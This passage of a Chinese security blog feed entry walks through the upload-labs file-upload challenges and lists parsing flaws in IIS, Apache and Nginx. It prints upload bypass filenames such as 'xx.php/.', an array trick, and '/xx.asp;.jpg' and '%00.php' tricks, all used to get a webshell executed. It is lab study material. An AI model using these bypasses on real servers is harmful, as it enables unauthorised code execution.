class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</span><br></pre></td></tr></table></figure><p>简单来说就是<code>move_uploaded_file</code>底层会调用<code>tsrm_realpath</code>函数导致，递归删除文件名最后的<code>/.</code>导致绕过了后缀名检测，同样类似的函数还有<code>file_put_content()</code>，反正打开文件流都会有类似的操作</p><p>所以可以这样子去绕过<code>6.php/.</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kJTg56.png" alt="kJTg56.png"></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将<code>/.</code>忽略，因此还是可以上传成功的。</p><p>因此save_name变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="https://s2.ax1x.com/2019/02/13/k0OSM9.png" alt="k0OSM9.png"></p><p><img src="https://s2.ax1x.com/2019/02/13/k0O9q1.png" alt="k0O9q1.png"></p><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>upload-labs里面的关卡个人感觉只是针对文件上传这个漏洞去弄的，可以梳理一下，可以根据上面的绕过写一个fuzz字典XD</p><ol><li>前端的绕过</li><li>后缀名，文件类型，文件头的绕过</li><li>Windows下::$DATA的问题</li><li>图片经过二次渲染的绕过</li><li>根据代码跳进进行的绕过</li><li>条件竞争</li></ol><p>还有其他的中间件问题导致的解析漏洞没有展现出来，可能环境配置比较麻烦，想了很久，我怕自己忘了，还是自己总结一下，以后可以拿出来看一下</p><h4 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h4><p><code>IIS 6.0</code>解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的<code>文件夹</code>，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg    /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa</span><br><span class="line">/xxx.cer</span><br><span class="line">/xxx.cdx</span><br><span class="line">/xxx.apsx</span><br></pre></td></tr></table></figure><h4 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h4><p>在正常图片URL后添加 /.php，可以解析为php</p><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>最近在出题的时候在apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了，真尴尬。</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>Nginx &lt;<code>8.03</code>畸形解析漏洞<br>直接在正常图片URL后添加<code>/.php</code><br>Nginx &lt;=<code>0.8.37</code><br>在Fast-CGI<code>关闭</code>的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无聊，把upload-labs所有的关卡都刷一遍
    
    </summary>
    
      <category term="文件上传" scheme="0verwatch.top/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="文件上传" scheme="0verwatch.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
</feed>
